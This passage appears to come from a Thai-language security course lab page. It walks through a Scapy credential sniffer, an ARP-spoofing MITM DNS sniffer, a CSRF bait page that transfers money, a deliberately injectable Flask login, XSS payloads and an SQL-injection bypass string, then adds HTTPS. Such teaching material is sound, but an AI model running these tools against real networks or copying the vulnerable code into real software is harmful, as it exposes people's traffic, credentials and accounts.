+ซึ่งเราสามารถใช้ Scapy จาก Python ได้ด้วย
+
+<Card title='Example 2'>
+
+```py
+#!/usr/bin/env python3
+
+import argparse
+import re
+from time import strftime, localtime
+from colorama import Fore, Style
+from scapy.all import sniff, TCP, IP, Raw
+
+parser = argparse.ArgumentParser(description='Network packet sniffer using scapy')
+parser.add_argument('--iface', help='Interface to sniff on', required=True)
+parser.add_argument('--keywords', help='File containing list of secret keywords to detect',
+                    required=True)
+parser.add_argument('--verbose', help='Adds timestamp, src, and dst IPs',
+                    action='store_true')
+parser.add_argument('--filter', help='BPF filter', required=True)
+opts = parser.parse_args()
+
+print('Loading file: '+opts.keywords)
+
+with open(opts.keywords, 'r') as f:
+    KEYWORDS = [i.strip() for i in f.readlines()]
+
+print('Loading success')
+
+def print_match(pattern, data):
+    """
+    This function makes output clearer to understand by highlighting the
+    keywords was found on the tcp payload.
+    """
+    print(f"{Fore.GREEN}!!! Possible secret found !!!{Style.RESET_ALL}")
+    re_pattern = re.compile('(' + pattern + ')')
+    values = re_pattern.split(data)
+    for i in values:
+        if re_pattern.match(i):
+            print(f'{Fore.RED}{i}{Style.RESET_ALL}', end='')
+        else:
+            print(i, end='')
+    print()
+
+def process_packet(packet):
+    """
+    Function that handles the received packets from scapy.
+    """
+    try:
+        if Raw in packet and opts.verbose:
+            time = strftime("%m/%d/%Y %H:%M:%S", localtime())
+            print(f'{time} : {packet.sniffed_on} {packet[IP].dst} -> {packet[IP].dst}')
+        data = str(packet[Raw].load)
+        for keyword in KEYWORDS:
+            if keyword in data:
+                print_match(keyword, data)
+    except IndexError:
+        pass
+
+if __name__ == '__main__':
+    sniff(iface=opts.iface, prn=process_packet, count=0, filter=opts.filter)
+```
+
+สร้างไฟล์ secret.txt สำหรับเก็บคำที่จะค้นหาเป็น dictionary
+
+```
+// secret.txt
+username
+password
+```
+
+ทำการทดสอบ
+
+```bash
+sudo ./sniff_scapy.py --iface enp0s3 --filter 'tcp port 80' --keywords /home/krit/labs/secret.txt
+```
+
+ทำการรัน Simple Server ของ Module ใน Python โดยเปิดพอร์ท 80
+
+```bash
+sudo python3 -m http.server 80
+```
+
+![Simple Server](../../../assets/images/lab3/python_simple_server.png)
+
+ใช้ CURL ส่งคำสั่ง POST ไปยัง Server โดยใช้ username คือ krit และ password คือ 1234 ไปยัง IP ของ Ubuntu
+
+```bash
+curl -L --interface enp0s3 -d 'username=krit&password=1234!' 192.168.96.155
+```
+
+:::caution[ระวัง]
+
+PowerShell เวอร์ชั่น 6 จะต้องใช้ curl.exe จะใช้ curl เฉยๆไม่ได้
+
+```ps
+curl.exe 
+```
+:::
+
+**OUTPUT**
+
+![Sniff Simple Server](../../../assets/images/lab3/sniff_simple_server.png)
+
+</Card>
+
+<Card title='Example 3'>
+
+ทีนี้เรามาลองดัก username กับ password จาก Flask และ Web Browser 
+
+โดยเปลี่ยนตรง filter ให้เป็น port 5000
+
+```bash
+sudo ./sniff_scapy.py --iface enp0s3 --filter 'tcp port 5000' --keywords /home/krit/labs/secret.txt
+```
+
+ก็จะสามารถดัก username กับ password ได้ดังรูปด้านล่าง
+
+**OUTPUT**
+
+![Sniff Flask](../../../assets/images/lab3/sniff_flask.png)
+
+</Card>
+
+## DNS Sniffer
+
+เมื่อเราดักการสื่อสารของอุปกรณ์ใดอุปกรณ์หนึ่ง นั่นก็คือ Sniff ซึ่งเราจะสามารถรู้ได้ว่าผู้ใช้ที่ใช้อุปกรณ์นี้ดูหรือเข้าเวบไซท์อะไรบ้าง โดยดูได้จาก DNS
+
+### MITM ARP Spoofing
+
+คอมพิวเตอร์จะสื่อสารกันผ่าน Switch เป็นตัวกลางทำหน้าที่คอยรับและส่งข้อมูลอุปกรณ์ที่ต่อผ่าน Switch นี้ ซึ่งข้อมูลที่ถูกส่งไปจะมีทั้ง IP กับ MAC ADDRESS ส่งไปด้วย
+ซึ่ง MAC ADDRESS นี้จะบอกถึงที่อยู่ของอุปกรณ์ โดยเก็บในรูปแบบฐาน 16 ซึ่งการทำงานจะอยู่ใน Layer 2 ซึ่งเป็นส่วนของอุปกรณ์จะตรวจสอบและสื่อสารกัน
+
+การจะรู้ MAC ADDRESS ได้นั้นจะต้องใช้ protocol ที่มืชื่อว่า ARP (Address Resolution Protocol) 
+
+รูปแบบการทำงาน ก็คือจะส่ง ARP Request เพื่อขอ MAC ADDRESS ผ่านไปยังอุปกรณ์ที่ชื่อว่า Switch
+โดย Switch จะมี ARP Table (ที่คอยจับคู่ระหว่าง IP กับ MAC ADDRESS) ถ้า Switch ตรวจสอบแล้วว่าไม่มี MAC ADDRESS ก็จะส่งต่อ ARP Request ไปให้กับอุปกรณ์อื่นๆที่เชื่อมต่ออยู่
+เพื่อขอ MAC ADDRESS อุปกรณ์เมื่อได้รับ ARP Request ก็จะส่ง ARP Reply โดยมี IP กับ MAC ADDRESS ของตัวอุปกรณ์นั้นๆกลับออกมา
+
+รายละเอียดเพิ่มเติมอ่านได้จาก https://www.9huatraining.com/post/arp-protocol
+
+<Card title='Example 1'>
+
+โดยก่อนจะติดตั้ง library จะต้องรันในโหมด virtual environment ก่อน
+
+```bash
+source .venv/bin/activate
+```
+
+ติดตั้ง library ดังต่อไปนี้ 
+
+<Steps>
+1. scapy
+    ```bash
+    pip install scapy
+    ```
+2. colorama
+    ```bash
+    pip install colorama
+    ```
+3. dns-vendor-lookup
+    ```bash
+    pip install dns-vendor-lookup
+    ```
+</Steps>
+
+```python
+// sniff_dns.py
+#!/usr/bin/env python3
+
+import argparse
+import threading
+from colorama import Fore, Style
+from time import strftime, localtime
+from scapy.all import arp_mitm, sniff, DNS, srp, Ether, ARP
+from mac_vendor_lookup import MacLookup, VendorNotFoundError
+
+parser = argparse.ArgumentParser(description='Device network sniffer')
+parser.add_argument('--network', help='Network to scan (eg "192.168.0.0/24")',
+                    required=True)
+parser.add_argument('--iface', help='Network interface to use', required=True)
+parser.add_argument('--routerip', help='IP of your home router ', required=True)
+opts = parser.parse_args()
+
+def arp_scan(network, iface):
+    """
+    Performs ARP ping across the local subnet. Once a device responds, its IP
+    and MAC address will be recorded. MAC address lookup will also be performed
+    against the pre-defined OUI in https://standards-oui.ieee.org/oui/oui.txt.
+    Do note that not all device are recognized so expect device will be
+    unrecognized.
+    """
+    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network),
+                     timeout=5, iface=iface)
+    print(f'\n{Fore.RED}######## NETWORK DEVICES ########{Style.RESET_ALL}\n')
+    for i in ans:
+        mac = i.answer[ARP].hwsrc
+        ip = i.answer[ARP].psrc
+        try:
+            vendor = MacLookup().lookup(mac)
+        except VendorNotFoundError:
+            vendor = 'uncrecognized device'
+        print(f'{Fore.BLUE}{ip}{Style.RESET_ALL} ({mac}, {vendor})')
+    return input('\nPick a device IP: ')
+
+class Device:
+    def __init__(self, routerip, targetip, iface):
+        self.routerip = routerip
+        self.targetip = targetip
+        self.iface = iface
+
+    def mitm(self):
+        while True:
+            try:
+                arp_mitm(self.routerip, self.targetip, iface=self.iface)
+            except OSError:
+                print('IP seems down, retrying ..')
+                continue
+
+    def capture(self):
+        sniff(iface=self.iface, prn=self.dns,
+              filter=f'src host {self.targetip} and udp port 53')
+
+    def dns(self, pkt):
+        record = pkt[DNS].qd.qname.decode('utf-8').strip('.')
+        time = strftime("%m/%d/%Y %H:%M:%S", localtime())
+        print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}{record}{Style.RESET_ALL}]')
+
+    def sniff(self):
+        t1 = threading.Thread(target=self.mitm, args=())
+        t2 = threading.Thread(target=self.capture, args=())
+
+        t1.start()
+        t2.start()
+
+if __name__ == '__main__':
+    targetip = arp_scan(opts.network, opts.iface)
+    device = Device(opts.routerip, targetip, opts.iface)
+    device.sniff()
+```
+
+:::tip
+
+ในกรณีการรันโปรแกรมนี้จะต้องอยู่ในโหมดของ sudo
+
+```python
+sudo -E env PATH="$PATH" python3 sniff_dns_full.py --network 192.168.96.0/24 --routerip 192.168.96.246 --iface enp0s3
+```
+:::
+
+**OUTPUT**
+
+![DNS Sniffer](../../../assets/images/lab3/dns_sniffer.png)
+
+
+</Card>
+
+## Basic Web Security
+รูปแบบการโจมตีใน Website ค่อนข้างมีมากมาย แต่ในที่นี้จะยกตัวอย่างการโจมตี เป็น CSRF, XSS และ SQL Injection
+
+### CSRF Attack
+
+<Card title='Example 1'>
+
+ในตัวอย่างนี้จะยกตัวอย่าง Website ที่มีการรับส่งค่าจาก Form ไปยัง Server โดยใช้ POST ถึงแม้ว่า Server จะเช็คว่ามีการ Login แล้วก็ตาม แต่ก็ไม่สามารถเช็คค่าจาก Form ที่ส่งผ่าน POST จากหน้าของ Hacker ได้
+
+:::tip
+ทำการรัน virutal environment ก่อน
+
+```bash
+source .venv/bin/activate
+```
+:::
+
+ติดตั้ง Flask-Login
+```bash
+pip install flask-login
+```
+
+<Tabs>
+<TabItem label='hackers/index.html'>
+
+:::danger
+อย่าลืมเปลี่ยน IP เป็น IP ของ Ubuntu ที่รัน Webserver อยู่
+:::
+
+```html del="192.168.96.155"
+<form hidden id="hack" target="csrf-frame" action="http://192.168.96.155:5000/accounts" method="POST" autocomplete="off">
+    <input type="number" name="amount" value="2000">
+    <input type="number" name="account" value="2">
+</form>
+<iframe hidden name="csrf-frame"></iframe>
+
+<h3>You won $100,000</h3>
+<button onClick="hack();" id="button">Click to claim</button>
+<br>
+<div id="warning"></div>
+
+<script>
+    function hack() {
+        document.getElementById("hack").submit();
+        document.getElementById("warning").innerHTML="check your bank balance! :)";
+    }
+</script>
+```
+</TabItem>
+<TabItem label='main.py'>
+```python
+from flask import Flask, render_template, request, Response, redirect, url_for, g
+from flask_login import (
+    LoginManager,
+    UserMixin,
+    current_user,
+    login_required,
+    login_user,
+    logout_user,
+)
+import sqlite3
+
+app = Flask(__name__, static_url_path='', static_folder='static', template_folder='templates')
+app.config.update(SECRET_KEY="secret_sauce")
+
+
+DATABASE = 'db.sqlite'
+
+def get_db():
+    db = getattr(g, '_database', None)
+    if db is None:
+        db = g._database = sqlite3.connect(DATABASE)
+        db.row_factory = sqlite3.Row
+    return db
+
+@app.teardown_appcontext
+def close_connection(exception):
+    db = getattr(g, '_database', None)
+    if db is not None:
+        db.close()
+
+login_manager = LoginManager()
+login_manager.init_app(app)
+
+
+# database
+users = [
+]
+
+transactions = [
+]
+
+def authen(username, password):
+    c = get_db().cursor()
+    sql = "SELECT * FROM users WHERE username = '"+username+"' AND password = '"+password+"'" 
+    print(sql)
+    c.execute(sql)
+    return c.fetchone()
+
+def get_users():
+    c = get_db().cursor()
+    c.execute('SELECT * FROM users')
+    return c.fetchall()
+    
+def update_user_balance(id, balance):
+    c = get_db()
+    c.execute("UPDATE users SET balance = %s WHERE id = %s" % (balance, id))
+    c.commit()
+
+class User(UserMixin):
+    ...
+
+
+def get_user(user_id: int):
+    users = get_users()
+    for user in users:
+        print(user)
+        if int(user["id"]) == int(user_id):
+            return user
+    return None
+
+
+@login_manager.user_loader
+def user_loader(id: int):
+    user = get_user(id)
+    if user:
+        user_model = User()
+        user_model.id = user["id"]
+        return user_model
+    return None
+
+
+@app.errorhandler(401)
+def unauthorized(error):
+    return Response("Not authorized"), 401
+
+
+@app.route("/")
+def index():
+    return render_template('index.html')
+
+def valid_login(username, password):
+    isValid = username != '' and password != ''
+    return isValid
+
+@app.route("/reset_balance")
+@login_required
+def reset_balance():
+    update_user_balance(1, 2000)
+    update_user_balance(2, 0)
+    current_user.balance = 2000
+    return redirect(url_for("accounts"))
+
+@app.route("/accounts", methods=["GET", "POST"])
+@login_required
+def accounts():
+    user = get_user(current_user.id)
+    if request.method == "POST":
+        try:
+            account = int(request.form.get("account"))
+            amount = int(request.form.get("amount"))
+        except:
+            account = request.form.get("account")
+            amount = request.form.get("amount")
+
+        transfer_to = get_user(account)
+
+        if isinstance(amount, int) and amount <= int(user["balance"]) and transfer_to and user:
+            print(transfer_to["balance"])
+            amount_left = int(user["balance"])
+            amount_left -= amount
+            # user["balance"] = amount
+            update_user_balance(user["id"], amount_left)
+            transfer_amount_left = int(transfer_to["balance"])
+            transfer_amount_left += amount
+            # transfer_to["balance"] = transfer_amount_left
+            update_user_balance(transfer_to["id"], transfer_amount_left)
+            user = get_user(current_user.id)
+        
+        transactions.append({'id':len(transactions),'amount':amount})
+
+
+    return render_template(
+        "accounts.html",
+        balance=user["balance"],
+        username=user["username"],
+        transactions=transactions
+    )
+
+
+@app.route('/login', methods=['POST', 'GET'])
+def login():
+    error = None
+    if request.method == "POST":
+        username = request.form.get("username")
+        password = request.form.get("password")
+
+        user = authen(username, password)
+
+        if user is None:
+            error = 'Invalid username/password'
+
+        user_model = User()
+        user_model.id = user["id"]
+        login_user(user_model)
+        return redirect(url_for("accounts"))
+        
+
+    if current_user.is_authenticated:
+        return redirect(url_for("accounts"))
+    if error is None:
+        return render_template("login.html")
+    return render_template("login.html", error=error)
+
+@app.route("/logout")
+@login_required
+def logout():
+    logout_user()
+    return redirect(url_for("index"))
+
+    
+if __name__ == '__main__':
+    app.run(host='0.0.0.0',debug=True,port=5000)
+```
+</TabItem>
+</Tabs>
+
+**OUTPUT**
+<Steps>
+1. รัน Flask
+    ```bash
+    flask --app main run --host 0.0.0.0 --debug
+    ```
+2. Login `username` คือ `test` และ `password` คือ `test`
+![Login Page](../../../assets/images/lab3/login.png)
+
+3. เปิดหน้า Website ตัวอย่างขึ้นมาแสดงให้เห็นว่าเรามีเงินอยู่ $2000
+![Simple Website](../../../assets/images/lab3/csrf.png)
+
+4. รัน Hackers Click Bait
+    ```bash
+    python3 -m http.server -b 0.0.0.0 5002
+    ```
+5. Hacker ทำหน้าหลอกขึ้นมาให้เรากดปุ่ม พอกดปุ่มก็ขึ้นบอกว่าให้เราเช็ค balance
+![Hacker Website](../../../assets/images/lab3/hacker_csrf_bait.png)
+
+6. ถ้า Refresh หน้า Website จะเห็นได้ว่า เงินจะเหลือ $0
+![CSRF Hacked](../../../assets/images/lab3/csrf_hacked.png)
+</Steps>
+</Card>
+
+### XSS Attack
+
+<Card title='Example 1'>
+
+
+
+ถ้าปิดตัว autoescape ไป
+
+```jinja
+{% autoescape false %}
+```
+
+หรือมีการอนุญาติให้แสดง tag html ออกมาได้
+
+```jinja
+{{ comment | safe }}
+```
+
+ใช้ tag script ใส่เข้าไปก็จะมีปัญหาตามรูปด้านล่างได้
+
+
+**OUTPUT**
+
+1. ป้อน code ลงไป
+```html
+tooltip onmouseover=alert(1)
+```
+![Input XSS](../../../assets/images/lab3/input_xss.png)
+เมื่อเอาเม้าส์ไปวาง
+![Result XSS](../../../assets/images/lab3/result_xss.png)
+2. หรือ ใส่ tag ลงไป
+```html
+<script>alert('javascript was executed')</script>
+```
+![Input2 XSS](../../../assets/images/lab3/input2_xss.png)
+ก็จะทำงานตอนโหลดหน้าใหม่ด้วยการ show alert
+![Result2 XSS](../../../assets/images/lab3/result2_xss.png)
+</Card>
+
+### SQL Injection Attack
+
+<Card title='Example 1'>
+
+ใส่ SQL ลงไปในช่อง Username
+
+```sql
+' OR 'a'='a';--
+```
+
+ซึ่ง SQL จริงๆ จะเป็นดังนี้
+
+```sql
+SELECT * FROM users WHERE username = '' OR 'a'='a';-- AND password = '';
+```
+
+![SQL Injection](../../../assets/images/lab3/sql_injection.png)
+
+เมื่อคลิก Sign in ไป ก็จะสามารถ bypass login ได้ดังรูปด้านล่าง
+
+![Result SQL Injection](../../../assets/images/lab3/result_sql_injection.png)
+
+:::danger
+สาเหตุเพราะการใช้ concatenation string กับ SQL
+
+```python
+def authen(username, password):
+    c = get_db().cursor()
+    sql = "SELECT * FROM users WHERE username = '"+username+"' AND password = '"+password+"'" 
+    c.execute(sql)
+    return c.fetchone()
+```
+
+:::
+
+</Card>
+
+### Install SSL Certificate
+
+<Card title='Example 1'>
+
+ในกรณีที่ใช้ http ธรรมดา จะไม่มีการเข้ารหัสข้อมูลที่รับส่งกัน ทำให้เกิดการ Sniff ได้ ดังนั้นวิธีแก้อย่างแรกคือการใช้งาน https
+โดยสร้าง Certificate ขึ้นมาด้วย OpenSSL 
+
+```bash
+openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365
+```
+
+โปรแกรมจะถาม ให้เราป้อนตามรูปข้างล่าง
+
+![Create Certificate](../../../assets/images/lab3/create_ssl_cert.png)
+
+:::danger
+การสร้าง Certificate รูปแบบนี้เค้าเรียกว่า Self Signed Certificate ซึ่งจะให้สำหรับพัฒนาภายในเครื่องเท่านั้น ไม่สามารถใช้งานจริงได้ เพราะยังไม่ถือว่าปลอดภัย
+:::
+
+แก้ไขตรงไฟล์ main.py
+
+```python
+// main.py
+app.run(host='0.0.0.0',debug=True, ssl_context=('cert.pem', 'key.pem'),port=5000)
+```
+
+หลังจากนั้นเวลาเราเปิด Browser ขึ้นมา Browser จะยังคงแจ้งเตือนว่า Website นี้ไม่ปลอดภัย เนื่องจาก certificate ที่ใช้ถูกสร้างขึ้นมาเพื่อใช้ในการพัฒนา
+
+![Invalid Cert](../../../assets/images/lab3/invalid_cert.png)
+
+จะต้องทำการกด `Advanced` และกด `Continue to` ตามรูปด้านล่าง
+
+![Accept invalid cert](../../../assets/images/lab3/accept_invalid_cert.png)
+
+ก็จะเข้าหน้า Website ได้แต่จะแจ้งเตือนว่า Website ไม่ปลอดภัย
+
+![Warning invalid cert](../../../assets/images/lab3/warning_invalid_cert.png)
+</Card>
+
